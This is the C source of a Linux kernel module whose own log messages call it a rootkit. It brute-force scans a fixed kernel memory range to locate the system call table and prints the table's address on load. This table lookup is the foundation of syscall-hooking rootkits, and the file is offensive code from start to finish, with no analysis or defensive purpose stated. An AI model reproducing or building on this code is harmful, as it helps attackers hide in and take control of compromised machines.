#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>

MODULE_LICENSE("Dual BSD/GPL");

#if defined(__i386__)
#define START 0xc0000000
#define END 0xd0000000
typedef unsigned int my_type;
#else
#define START 0xffffffff81000000
#define END 0xffffffffa2000000
typedef unsigned long my_type;
#endif

my_type **find(void)
{
    my_type **table;
    my_type start = START;
    my_type end = END;
    while (start < end)
    {
        table = (my_type **) start;
        if (table[__NR_close] == (my_type *) sys_close)
            return &table[0];
        start += sizeof(void *);
    }
    return NULL;
}

static int _init(void) {
    my_type* syscalltable = 0;
    printk("rootkit loaded\n");
    syscalltable = (my_type* ) find();
    printk("sys call table: %p\n", syscalltable);
    return 0;
}

static void _exit(void) {
 printk("rootkit removed\n");
}

module_init(_init);
module_exit(_exit);
